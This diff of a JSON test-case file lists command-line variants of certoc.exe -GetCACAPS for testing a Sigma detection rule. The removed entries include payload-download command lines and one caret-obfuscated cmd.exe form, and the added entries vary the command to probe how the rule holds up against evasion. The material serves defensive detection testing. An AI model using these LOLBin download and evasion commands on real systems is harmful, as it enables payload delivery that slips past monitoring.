@@ -1,18 +1,26 @@
 [
   {
-    "output": "certoc.exe -GetCACAPS \"http://example.com/payload.dll\"",
-    "explanation": "Original command with quotes added around the URL for safe testing."
+    "output": "\"C:\\\\Windows\\\\SysWOW64\\\\certoc.exe\" -GetCACAPS http://192.0.2.10/certsrv/",
+    "explanation": "Original command line for testing the Sigma rule."
   },
   {
-    "output": "certoc.exe /GetCACAPS http://example.com/payload.dll",
-    "explanation": "Substitution of '-' with '/' for the flag, which is an equivalent syntax in Windows command-line tools."
+    "output": "\"C:\\\\Windows\\\\SysWOW64\\\\certoc.exe\" -GetCACAPS http://192.0.2.10/certsrv",
+    "explanation": "Omission of the trailing slash in the URL, which is still valid and should trigger the rule."
   },
   {
-    "output": "certoc.exe -GetCACAPS http://192.168.1.100/payload.ext",
-    "explanation": "Omission of quotes and substitution of URL to a local IP for safe testing."
+    "output": "\"C:\\\\Windows\\\\SysWOW64\\\\certoc.exe\" -GetCACAPS http://192.0.2.10/certsrv/   ",
+    "explanation": "Insertion of trailing spaces in the command line, which should not affect the rule's detection."
   },
   {
-    "output": "cmd.exe /c \"certoc.exe -GetCACAPS h^t^t^p^:^/^/http://example.com/payload.dll\"",
-    "explanation": "Reordering and escaping characters in the URL for testing in a controlled environment."
+    "output": "\"C:\\\\Windows\\\\SysWOW64\\\\certoc.exe\" -GetCACAPS http://192.0.2.10/certsrv/ -",
+    "explanation": "Appending an extraneous '-' at the end of the command line, which should not affect the rule's detection."
+  },
+  {
+    "output": "\"C:\\\\Windows\\\\SysWOW64\\\\certoc.exe\" -GetCACAPS http://192.0.2.10/certsrv/ -GetCACAPS",
+    "explanation": "Repetition of the -GetCACAPS flag, which may be accepted by the program and still trigger the rule."
+  },
+  {
+    "output": "\"C:\\\\Windows\\\\SysWOW64\\\\certoc.exe\" -GetCACAPS http://192.0.2.10/certsrv/",
+    "explanation": "Substitution of backslashes with double backslashes for path normalization, which should not affect the rule's detection."
   }
 ]
